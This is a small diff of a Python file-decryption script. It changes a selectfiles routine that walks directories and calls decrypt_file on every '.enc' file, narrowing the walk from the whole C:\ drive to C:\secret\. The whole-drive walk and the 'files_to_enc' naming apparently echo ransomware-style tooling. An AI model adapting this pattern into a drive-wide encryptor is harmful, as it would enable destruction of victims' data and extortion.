@@ -26,7 +26,7 @@ def decrypt_file(key, in_filename, out_filename=None, chunksize=64*1024):
 
 def selectfiles():
     files_to_enc = []
-    for root, dirs, files in os.walk("C:\\"):
+    for root, dirs, files in os.walk("C:\\secret\\"):
         for file in files:
             if file.endswith(".enc"):
                 decrypt_file(key,os.path.join(root, file))
